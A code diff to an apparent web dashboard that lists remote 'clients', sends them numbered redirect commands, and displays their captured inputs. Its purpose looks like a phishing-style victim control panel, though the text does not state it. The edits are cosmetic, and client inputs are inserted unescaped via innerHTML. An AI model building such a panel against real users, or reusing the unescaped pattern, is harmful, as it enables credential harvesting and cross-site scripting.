@@ -15,19 +15,15 @@
       clientList.forEach(client => {
         const clientDiv = document.createElement('div');
         clientDiv.innerHTML = `
-          <p>Client ${client.clientId}</p>
+          <p>Client: ${client.name || client.clientId}</p>
           <button onclick="sendCommand('${client.clientId}', 'redirect1')">Redirect 1</button>
           <button onclick="sendCommand('${client.clientId}', 'redirect2')">Redirect 2</button>
-          <button onclick="sendCommand('${client.clientId}', 'redirect3')">Redirect 3</button>
-          <button onclick="sendCommand('${client.clientId}', 'redirect4')">Redirect 4</button>
-          <button onclick="sendCommand('${client.clientId}', 'redirect5')">Redirect 5</button>
-          <button onclick="sendCommand('${client.clientId}', 'redirect6')">Redirect 6</button>
-          <button onclick="sendCommand('${client.clientId}', 'redirect7')">Redirect 7</button>
+          <!-- Add more buttons as needed -->
           <button onclick="viewInputs('${client.clientId}')">View Inputs</button>
           <button onclick="deleteClient('${client.clientId}')">Delete</button>
           <div id="inputs-${client.clientId}" style="display: none;">
             <h3>Inputs:</h3>
-            ${client.inputs.join('<br>')}
+            ${client.inputs.map(input => `<p>${input}</p>`).join('')}
           </div>
         `;
         clientsDiv.appendChild(clientDiv);
@@ -46,7 +42,11 @@
 
     function viewInputs(clientId) {
       const inputsDiv = document.getElementById(`inputs-${clientId}`);
-      inputsDiv.style.display = inputsDiv.style.display === 'none' ? 'block' : 'none';
+      if (inputsDiv.style.display === 'none') {
+        inputsDiv.style.display = 'block';
+      } else {
+        inputsDiv.style.display = 'none';
+      }
     }
 
     function deleteClient(clientId) {
